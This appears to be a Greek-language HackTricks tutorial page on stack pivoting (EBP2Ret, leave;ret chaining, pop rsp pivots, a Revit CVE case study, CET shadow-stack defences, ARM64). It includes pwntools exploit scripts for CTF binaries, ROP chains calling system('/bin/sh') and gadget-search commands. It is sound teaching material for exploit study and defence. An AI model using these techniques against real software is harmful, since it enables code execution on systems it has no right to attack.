# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Αυτή η τεχνική εκμεταλλεύεται την ικανότητα να χειρίζεται κανείς τον **Base Pointer (EBP/RBP)** για να αλυσοδέσει την εκτέλεση πολλαπλών συναρτήσεων μέσω προσεκτικής χρήσης του frame pointer και της **`leave; ret`** ακολουθίας εντολών.

Ως υπενθύμιση, σε x86/x86-64 **`leave`** είναι ισοδύναμο με:
```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```
Και καθώς το αποθηκευμένο **EBP/RBP βρίσκεται στην στοίβα** πριν από το αποθηκευμένο EIP/RIP, είναι δυνατόν να το ελέγξετε ελέγχοντας την στοίβα.

> Σημειώσεις
> - Σε 64-bit, αντικαταστήστε EBP→RBP και ESP→RSP. Η σημασιολογία είναι η ίδια.
> - Ορισμένοι μεταγλωττιστές παραλείπουν τον frame pointer (βλ. “EBP might not be used”). Σε αυτή την περίπτωση, `leave` μπορεί να μην εμφανιστεί και αυτή η τεχνική δεν θα λειτουργήσει.

### EBP2Ret

Αυτή η τεχνική είναι ιδιαίτερα χρήσιμη όταν μπορείτε να **αλλάξετε το αποθηκευμένο EBP/RBP αλλά δεν έχετε άμεσο τρόπο να αλλάξετε το EIP/RIP**. Εκμεταλλεύεται τη συμπεριφορά του epilogue της συνάρτησης.

Εάν, κατά τη διάρκεια της εκτέλεσης του `fvuln`, καταφέρετε να εγχύσετε ένα **ψευδές EBP** στη στοίβα που δείχνει σε μια περιοχή μνήμης όπου βρίσκεται η διεύθυνση του shellcode/ROP chain σας (συν 8 bytes σε amd64 / 4 bytes σε x86 για να ληφθεί υπόψη το `pop`), μπορείτε να ελέγξετε έμμεσα το RIP. Καθώς η συνάρτηση επιστρέφει, το `leave` θέτει το RSP στην κατασκευασμένη θέση και το επόμενο `pop rbp` μειώνει το RSP, **κάντοντάς το ουσιαστικά να δείχνει σε μια διεύθυνση που έχει αποθηκεύσει εκεί ο επιτιθέμενος**. Στη συνέχεια το `ret` θα χρησιμοποιήσει αυτή τη διεύθυνση.

Σημειώστε ότι χρειάζεστε **να γνωρίζετε 2 διευθύνσεις**: τη διεύθυνση στην οποία θα πάει το ESP/RSP, και την τιμή που είναι αποθηκευμένη σε εκείνη τη διεύθυνση την οποία θα καταναλώσει το `ret`.

#### Exploit Construction

Πρώτα πρέπει να γνωρίζετε μια **διεύθυνση όπου μπορείτε να γράψετε αυθαίρετα δεδομένα/διευθύνσεις**. Το RSP θα δείξει εδώ και θα **καταναλώσει το πρώτο `ret`**.

Έπειτα, πρέπει να επιλέξετε τη διεύθυνση που θα χρησιμοποιήσει το `ret` και που θα **μεταφέρει την εκτέλεση**. Μπορείτε να χρησιμοποιήσετε:

- Μια έγκυρη [**ONE_GADGET**](https://github.com/david942j/one_gadget) address.
- Τη διεύθυνση της **`system()`** ακολουθούμενη από την κατάλληλη επιστροφή και ορίσματα (σε x86: στόχος `ret` = `&system`, έπειτα 4 junk bytes, έπειτα `&"/bin/sh"`).
- Τη διεύθυνση ενός **`jmp esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) ακολουθούμενη από inline shellcode.
- Μια [**ROP**](../rop-return-oriented-programing/index.html) chain staged σε εγγράψιμη μνήμη.

Θυμηθείτε ότι πριν από οποιαδήποτε από αυτές τις διευθύνσεις στην ελεγχόμενη περιοχή, πρέπει να υπάρχει **χώρος για το `pop ebp/rbp`** από το `leave` (8B σε amd64, 4B σε x86). Μπορείτε να εκμεταλλευτείτε αυτά τα bytes για να ορίσετε ένα **δεύτερο ψεύτικο EBP** και να διατηρήσετε τον έλεγχο μετά την επιστροφή της πρώτης κλήσης.

#### Off-By-One Exploit

Υπάρχει μια παραλλαγή που χρησιμοποιείται όταν μπορείτε να **τροποποιήσετε μόνο το λιγότερο σημαντικό byte του αποθηκευμένου EBP/RBP**. Σε τέτοια περίπτωση, η θέση μνήμης που αποθηκεύει τη διεύθυνση στην οποία θα πηδήξει το **`ret`** πρέπει να μοιράζεται τα πρώτα τρία/πέντε bytes με το αρχικό EBP/RBP ώστε ένα 1-byte overwrite να μπορεί να το ανακατευθύνει. Συνήθως το low byte (offset 0x00) αυξάνεται για να πηδήξει όσο το δυνατόν πιο μακριά μέσα σε μια κοντινή σελίδα/ευθυγραμμισμένη περιοχή.

Επίσης είναι σύνηθες να χρησιμοποιείται ένα RET sled στη στοίβα και να τοποθετείται η πραγματική ROP chain στο τέλος, ώστε να είναι πιο πιθανό το νέο RSP να δείχνει μέσα στο sled και να εκτελεστεί η τελική ROP chain.

### EBP Chaining

Τοποθετώντας μια ελεγχόμενη διεύθυνση στην αποθηκευμένη θέση `EBP` της στοίβας και ένα gadget `leave; ret` στο `EIP/RIP`, είναι δυνατόν να **μετακινήσετε το `ESP/RSP` σε μια διεύθυνση ελεγχόμενη από τον επιτιθέμενο**.

Τώρα το `RSP` είναι ελεγχόμενο και η επόμενη εντολή είναι `ret`. Τοποθετήστε στη ελεγχόμενη μνήμη κάτι σαν:

- `&(next fake EBP)` -> Φορτώνεται από το `pop ebp/rbp` του `leave`.
- `&system()` -> Κληθεί από το `ret`.
- `&(leave;ret)` -> Μετά το τέλος του `system`, μετακινεί το RSP στο επόμενο ψεύτικο EBP και συνεχίζει.
- `&("/bin/sh")` -> Όρισμα για το `system`.

Με αυτόν τον τρόπο είναι δυνατόν να αλυσοδέσετε αρκετά ψεύτικα EBPs για να ελέγξετε τη ροή του προγράμματος.

Αυτό μοιάζει με ένα [ret2lib](../rop-return-oriented-programing/ret2lib/index.html), αλλά πιο σύνθετο και χρήσιμο μόνο σε ακραίες περιπτώσεις.

Moreover, here you have an [**example of a challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) that uses this technique with a **stack leak** to call a winning function. This is the final payload from the page:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of another fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)

payload += flat(
buffer,         # Load leaked address in RBP
LEAVE_RET       # Use leave to move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
> amd64 alignment tip: Το System V ABI απαιτεί 16-byte στοίχιση του stack στα call sites. Αν το chain σας καλεί συναρτήσεις όπως `system`, προσθέστε ένα alignment gadget (π.χ. `ret`, ή `sub rsp, 8 ; ret`) πριν την κλήση για να διατηρηθεί η στοίχιση και να αποφευχθούν crashes από `movaps`.

## EBP μπορεί να μην χρησιμοποιείται

Όπως [**explained in this post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), αν ένα binary μεταγλωττιστεί με κάποιες βελτιστοποιήσεις ή με παράλειψη του frame-pointer, το **EBP/RBP ποτέ δεν ελέγχει το ESP/RSP**. Επομένως, οποιοδήποτε exploit που λειτουργεί ελέγχοντας το EBP/RBP θα αποτύχει επειδή ο prologue/epilogue δεν επαναφέρει από τον frame pointer.

- Δεν έχουν γίνει βελτιστοποιήσεις / χρησιμοποιείται frame pointer:
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
- Βελτιστοποιημένο / frame pointer παραλείφθηκε:
```bash
push   %ebx         # save callee-saved register
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore
ret                 # return
```
Σε amd64 συχνά θα δείτε `pop rbp ; ret` αντί για `leave ; ret`, αλλά αν το frame pointer παραλείπεται εντελώς τότε δεν υπάρχει epilogue βασισμένο στο `rbp` για να γίνει pivot μέσω αυτού.

## Άλλοι τρόποι ελέγχου του RSP

### `pop rsp` gadget

[**In this page**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) you can find an example using this technique. Για εκείνη την πρόκληση χρειάστηκε να κληθεί μια συνάρτηση με 2 συγκεκριμένα ορίσματα, και υπήρχε ένα **`pop rsp` gadget** και υπάρχει ένα **leak from the stack**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg <reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

Δες την τεχνική ret2esp εδώ:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

### Εύρεση pivot gadgets γρήγορα

Χρησιμοποίησε το αγαπημένο σου gadget finder για να αναζητήσεις classic pivot primitives:

- `leave ; ret` on functions or in libraries
- `pop rsp` / `xchg rax, rsp ; ret`
- `add rsp, <imm> ; ret` (or `add esp, <imm> ; ret` on x86)

Παραδείγματα:
```bash
# Ropper
ropper --file ./vuln --search "leave; ret"
ropper --file ./vuln --search "pop rsp"
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# ROPgadget
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```
### Classic pivot staging pattern

Μια στιβαρή pivot στρατηγική που χρησιμοποιείται σε πολλά CTFs/exploits:

1) Χρησιμοποιήστε ένα μικρό αρχικό overflow για να καλέσετε `read`/`recv` σε μια μεγάλη εγγράψιμη περιοχή (π.χ., `.bss`, heap, ή mapped RW memory) και τοποθετήστε εκεί μια πλήρη ROP chain.
2) Επιστρέψτε σε ένα pivot gadget (`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`) για να μεταφέρετε το RSP σε εκείνη την περιοχή.
3) Συνεχίστε με το staged chain (π.χ., leak libc, καλέστε `mprotect`, μετά `read` shellcode, και μετά κάντε jump σε αυτό).

### Windows: Destructor-loop weird-machine pivots (Revit RFA case study)

Οι client-side parsers μερικές φορές υλοποιούν destructor loops που καλούν έμμεσα έναν function pointer προερχόμενο από attacker-controlled πεδία αντικειμένων. Αν κάθε επανάληψη προσφέρει ακριβώς μία indirect call (ένα “one-gadget” machine), μπορείτε να το μετατρέψετε σε ένα αξιόπιστο stack pivot και ROP entry.

Παρατηρήθηκε στο Autodesk Revit RFA deserialization (CVE-2025-5037):

- Κατασκευασμένα αντικείμενα τύπου `AString` τοποθετούν έναν pointer σε attacker bytes στη μετατόπιση 0.
- Το destructor loop εκτελεί ουσιαστικά ένα gadget ανά αντικείμενο:
```asm
rcx = [rbx]              ; object pointer (AString*)
rax = [rcx]              ; pointer to controlled buffer
call qword ptr [rax]     ; execute [rax] once per object
```
Δύο πρακτικά pivots:

- Windows 10 (32-bit heap addrs): μη ευθυγραμμισμένο “monster gadget” που περιέχει `8B E0` → `mov esp, eax`, και τελικά `ret`, για να γίνει pivot από το call primitive σε μια heap-based ROP chain.
- Windows 11 (full 64-bit addrs): χρησιμοποιήστε δύο objects για να οδηγήσετε ένα constrained weird-machine pivot:
  - Gadget 1: `push rax ; pop rbp ; ret` (μεταφέρει το αρχικό rax στο rbp)
  - Gadget 2: `leave ; ... ; ret` (γίνεται `mov rsp, rbp ; pop rbp ; ret`), κάνοντας pivot στο buffer του πρώτου αντικειμένου, όπου ακολουθεί μια συμβατική ROP chain.

Συμβουλές για Windows x64 μετά το pivot:

- Σεβαστείτε το 0x20-byte shadow space και διατηρήστε 16-byte ευθυγράμμιση πριν από σημεία `call`. Συχνά είναι βολικό να τοποθετείτε σταθερές πάνω από τη διεύθυνση επιστροφής και να χρησιμοποιείτε ένα gadget όπως `lea rcx, [rsp+0x20] ; call rax` ακολουθούμενο από `pop rax ; ret` για να περάσετε διευθύνσεις στο stack χωρίς να διαφθείρετε τη ροή ελέγχου.
- Non-ASLR helper modules (αν υπάρχουν) παρέχουν σταθερά pools από gadgets και imports όπως `LoadLibraryW`/`GetProcAddress` για να επιλύσετε δυναμικά στόχους όπως `ucrtbase!system`.
- Δημιουργία ελλειπόντων gadgets μέσω ενός writable thunk: αν μια υποσχόμενη ακολουθία τελειώνει σε `call` μέσω ενός writable function pointer (π.χ. DLL import thunk ή function pointer στο .data), αντικαταστήστε αυτόν τον pointer με ένα benign single-step όπως `pop rax ; ret`. Η ακολουθία τότε συμπεριφέρεται σαν να τελείωνε με `ret` (π.χ. `mov rdx, rsi ; mov rcx, rdi ; ret`), που είναι ανεκτίμητο για να φορτώσετε τα Windows x64 arg registers χωρίς να καταστρέψετε άλλα.

Για την πλήρη κατασκευή της αλυσίδας και παραδείγματα gadgets, δείτε την αναφορά παρακάτω.

## Σύγχρονες μετρήσεις που σπάνε stack pivoting (CET/Shadow Stack)

Τα σύγχρονα x86 CPUs και OSes υιοθετούν όλο και περισσότερο **CET Shadow Stack (SHSTK)**. Με το SHSTK ενεργοποιημένο, το `ret` συγκρίνει τη διεύθυνση επιστροφής στην κανονική στοίβα με μια hardware-protected shadow stack· οποιαδήποτε ασυμφωνία προκαλεί Control-Protection fault και τερματίζει τη διεργασία. Επομένως, τεχνικές όπως EBP2Ret/leave;ret-based pivots θα κάνουν crash μόλις εκτελεστεί το πρώτο `ret` από μια pivoted stack.

- Για υπόβαθρο και πιο αναλυτικές λεπτομέρειες δείτε:


{{#ref}}
../common-binary-protections-and-bypasses/cet-and-shadow-stack.md
{{#endref}}

- Γρήγοροι έλεγχοι στο Linux:
```bash
# 1) Is the binary/toolchain CET-marked?
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# 2) Is the CPU/kernel capable?
grep -E 'user_shstk|ibt' /proc/cpuinfo

# 3) Is SHSTK active for this process?
grep -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)

# 4) In pwndbg (gdb), checksec shows SHSTK/IBT flags
(gdb) checksec
```
- Σημειώσεις για labs/CTF:
- Ορισμένες σύγχρονες διανομές ενεργοποιούν το SHSTK για CET-enabled binaries όταν υπάρχει υποστήριξη hardware και glibc. Για ελεγχόμενα tests σε VMs, το SHSTK μπορεί να απενεργοποιηθεί system-wide μέσω του kernel boot parameter `nousershstk`, ή να ενεργοποιηθεί επιλεκτικά μέσω glibc tunables κατά το startup (βλ. references). Μην απενεργοποιείτε mitigations σε production targets.
- JOP/COOP or SROP-based techniques μπορεί να εξακολουθούν να είναι βιώσιμες σε κάποιους στόχους, αλλά το SHSTK συγκεκριμένα σπάει `ret`-based pivots.

- Σημείωση Windows: Windows 10+ εκθέτει user-mode και το Windows 11 προσθέτει kernel-mode “Hardware-enforced Stack Protection” βασισμένο σε shadow stacks. CET-compatible processes αποτρέπουν stack pivoting/ROP στο `ret`; οι developers κάνουν opt-in μέσω CETCOMPAT και σχετικών policies (βλ. reference).

## ARM64

In ARM64, the **prologue and epilogues** of the functions **don't store and retrieve the SP register** in the stack. Moreover, the **`RET`** instruction doesn't return to the address pointed by SP, but **to the address inside `x30`**.

Therefore, by default, just abusing the epilogue you **won't be able to control the SP register** by overwriting some data inside the stack. And even if you manage to control the SP you would still need a way to **control the `x30`** register.

- prologue

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP points to frame record
```

- epilogue

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

> [!CAUTION]
> Ο τρόπος για να κάνεις κάτι ανάλογο με stack pivoting σε ARM64 είναι να μπορείς να **ελέγξεις το `SP`** (π.χ. ελέγχοντας κάποιο register της τιμής του οποίου ανατίθεται στο `SP`, ή επειδή για κάποιο λόγο το `SP` παίρνει τη διεύθυνσή του από το stack και έχουμε overflow) και στη συνέχεια να **κακοποιήσεις το epilogue** για να φορτώσεις το register **`x30`** από ένα **ελεγχόμενο `SP`** και να κάνεις **`RET`** σε αυτό.

Also in the following page you can see the equivalent of **Ret2esp in ARM64**:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

## References

- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)
- 64 bit, off-by-one exploitation με μια rop chain που ξεκινάει με ret sled
- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)
- 64 bit, no relro, canary, nx and pie. Το πρόγραμμα δίνει ένα leak για stack ή pie και ένα WWW ενός qword. Πρώτα πάρε το stack leak και χρησιμοποίησε το WWW για να επιστρέψεις και να πάρεις το pie leak. Έπειτα χρησιμοποίησε το WWW για να δημιουργήσεις έναν "αιώνιο" βρόχο κακοποιώντας εγγραφές του `.fini_array` + καλώντας `__libc_csu_fini` ([περισσότερες πληροφορίες εδώ](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)). Κακοποιώντας αυτήν την "αιώνια" εγγραφή, γράφεται μια ROP chain στο .bss και στο τέλος καλείται αυτή pivoting με RBP.
- Linux kernel documentation: Control-flow Enforcement Technology (CET) Shadow Stack — λεπτομέρειες για SHSTK, `nousershstk`, `/proc/$PID/status` flags, και ενεργοποίηση μέσω `arch_prctl`. https://www.kernel.org/doc/html/next/x86/shstk.html
- Microsoft Learn: Kernel Mode Hardware-enforced Stack Protection (CET shadow stacks on Windows). https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection
- [Crafting a Full Exploit RCE from a Crash in Autodesk Revit RFA File Parsing (ZDI blog)](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)

{{#include ../../banners/hacktricks-training.md}}
